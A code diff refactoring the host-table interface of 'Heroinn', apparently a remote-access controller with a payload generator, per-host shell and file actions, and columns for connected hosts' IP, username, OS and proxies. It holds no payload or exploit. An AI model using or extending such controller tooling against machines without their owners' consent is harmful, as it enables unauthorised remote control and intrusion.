@@ -12,7 +12,9 @@ use heroinn_util::{
 use std::path::PathBuf;
 
 mod controller;
+mod host_view;
 mod msgbox;
+use host_view::{HOST_COLUMNS, HOST_ROW_HEIGHT, host_table_min_width};
 
 #[derive(Clone, Copy, Debug, PartialEq)]
 enum SwitchDock {
@@ -35,12 +37,12 @@ mod tests {
 
     #[test]
     fn proxy_columns_are_immediately_before_remark() {
-        let remark = HOST_COLUMN_TITLES
+        let remark = HOST_COLUMNS
             .iter()
-            .position(|title| *title == "Remark")
+            .position(|column| column.title == "Remark")
             .unwrap();
-        assert_eq!(HOST_COLUMN_TITLES[remark - 2], "System Proxy");
-        assert_eq!(HOST_COLUMN_TITLES[remark - 1], "SOCKS5 Proxy");
+        assert_eq!(HOST_COLUMNS[remark - 2].title, "System Proxy");
+        assert_eq!(HOST_COLUMNS[remark - 1].title, "SOCKS5 Proxy");
     }
 
     #[test]
@@ -233,7 +235,6 @@ struct HeroinnApp {
     text_socks5_password: String,
     combox_generator_protocol: HeroinnProtocol,
     combox_generator_platform: HeroinnPlatform,
-    host_image: Option<egui::TextureHandle>,
     listener_image: Option<egui::TextureHandle>,
     transfer_rate_dialog: Option<TransferRateDialog>,
 }
@@ -256,27 +257,12 @@ impl Default for HeroinnApp {
             text_socks5_password: String::new(),
             combox_generator_protocol: HeroinnProtocol::TCP,
             combox_generator_platform: HeroinnPlatform::WindowsX64,
-            host_image: None,
             listener_image: None,
             transfer_rate_dialog: None,
         }
     }
 }
 
-const HOST_TABLE_MIN_WIDTH: f32 = 1500.0;
-const HOST_COLUMN_TITLES: [&str; 11] = [
-    "",
-    "Peer IP",
-    "Whoami",
-    "Host Name",
-    "OS",
-    "Protocol",
-    "Transfer Rate",
-    "Last Heartbeat",
-    "System Proxy",
-    "SOCKS5 Proxy",
-    "Remark",
-];
 const MAX_PROXY_CELL_CHARS: usize = 96;
 
 fn sanitize_ui_text(input: &str) -> String {
@@ -346,9 +332,6 @@ impl eframe::App for HeroinnApp {
             self.initilized = true;
         }
 
-        if self.host_image.is_none() {
-            self.host_image = Some(load_icon(&ctx, "host.ico", include_bytes!("res/host.ico")));
-        }
         if self.listener_image.is_none() {
             self.listener_image = Some(load_icon(
                 &ctx,
@@ -393,9 +376,7 @@ impl HeroinnApp {
                     .size(Size::exact(15.0))
                     .vertical(|mut strip| {
                         strip.cell(|ui| {
-                            ui.vertical_centered(|ui| {
-                                self.host_table(ui);
-                            });
+                            self.host_table(ui);
                         });
                         strip.cell(|ui| {
                             ui.vertical_centered(|ui| {
@@ -847,30 +828,23 @@ impl HeroinnApp {
         egui::ScrollArea::horizontal()
             .auto_shrink([false, false])
             .show(ui, |ui| {
-                ui.set_min_width(HOST_TABLE_MIN_WIDTH);
-                TableBuilder::new(ui)
+                ui.set_min_width(host_table_min_width(ui.spacing().item_spacing.x));
+                let mut table = TableBuilder::new(ui)
                     .striped(true)
                     // egui >= 0.20 no longer upgrades a hover-only response to a clickable
                     // one inside `context_menu`, so the cells must sense clicks themselves
                     // for the per-row context menu to open.
                     .sense(egui::Sense::click())
-                    .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
-                    .column(Column::initial(48.0).at_least(48.0))
-                    .column(Column::initial(145.0).at_least(90.0))
-                    .column(Column::initial(100.0).at_least(70.0))
-                    .column(Column::initial(135.0).at_least(90.0))
-                    .column(Column::initial(180.0).at_least(100.0))
-                    .column(Column::initial(85.0).at_least(70.0))
-                    .column(Column::initial(105.0).at_least(80.0))
-                    .column(Column::initial(115.0).at_least(90.0))
-                    .column(Column::initial(170.0).at_least(130.0))
-                    .column(Column::initial(170.0).at_least(130.0))
-                    .column(Column::initial(180.0).at_least(120.0))
+                    .cell_layout(egui::Layout::left_to_right(egui::Align::Center));
+                for column in HOST_COLUMNS {
+                    table = table.column(Column::initial(column.initial).at_least(column.minimum));
+                }
+                table
                     .resizable(self.resizable)
                     .header(20.0, |mut header| {
-                        for title in HOST_COLUMN_TITLES {
+                        for column in HOST_COLUMNS {
                             header.col(|ui| {
-                                ui.heading(title);
+                                ui.heading(column.title);
                             });
                         }
                     })
@@ -889,12 +863,12 @@ impl HeroinnApp {
                                     ui.close();
                                 }
                                 if ui.button("File").clicked() {
-                                    match open_ftp(&clientid) {
-                                        Ok(_) => {}
-                                        Err(e) => {
-                                            msgbox::error(&"Shell".to_string(), &format!("{}", e));
+                                    let clientid = clientid.clone();
+                                    std::thread::spawn(move || {
+                                        if let Err(e) = open_ftp(&clientid) {
+                                            msgbox::error(&"File".to_string(), &format!("{}", e));
                                         }
-                                    };
+                                    });
                                     ui.close();
                                 }
                                 let rate_requested = std::cell::Cell::new(false);
@@ -909,17 +883,10 @@ impl HeroinnApp {
                                 }
                             };
 
-                            let row_height = 30.0;
+                            let row_height = HOST_ROW_HEIGHT;
                             body.row(row_height, |mut row| {
                                 row.col(|ui| {
-                                    if let Some(tex) = &self.host_image {
-                                        ui.add(egui::Image::from_texture(
-                                            egui::load::SizedTexture::new(
-                                                tex.id(),
-                                                egui::Vec2::new(30.0, 30.0),
-                                            ),
-                                        ));
-                                    }
+                                    host_view::draw_host_platform_icon(ui, &info.info);
                                 })
                                 .1
                                 .context_menu(menu);
